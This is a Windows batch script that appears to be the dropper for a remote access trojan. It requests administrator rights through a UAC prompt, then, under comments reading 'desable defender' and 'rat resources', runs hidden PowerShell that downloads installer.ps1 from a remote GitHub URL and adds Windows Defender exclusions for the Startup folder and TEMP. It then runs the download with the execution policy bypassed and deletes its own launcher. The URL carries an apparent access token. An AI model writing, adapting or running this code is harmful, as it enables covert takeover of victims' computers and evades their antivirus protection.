@echo off
:: BatchGotAdmin - Request Admin Privileges







REM --> Check for Admin Rights
IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
    >nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
    >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

REM --> If error flag set, we do not have admin.
IF %errorlevel% NEQ 0 (
    echo Requesting administrative privileges...
    goto UACPrompt
) ELSE (
    goto gotAdmin
)

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application") > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %*", "", "runas", 1 >> "%temp%\getadmin.vbs"

    cscript //nologo "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"

REM desable defender

REM rat resources
powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/m98m98/tar2/refs/heads/main/installer.ps1?token=GHSAT0AAAAAAC7AO3Q2MQS6V7PQHPEFL4BCZ5SPZEA -OutFile installer.ps1"; Add-MpPreference -ExclusionPath "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup";Add-MpPreference -ExclusionPath "$env:TEMP"
powershell powershell.exe -windowstyle hidden -ep bypass ./installer.ps1
del wget.cmd
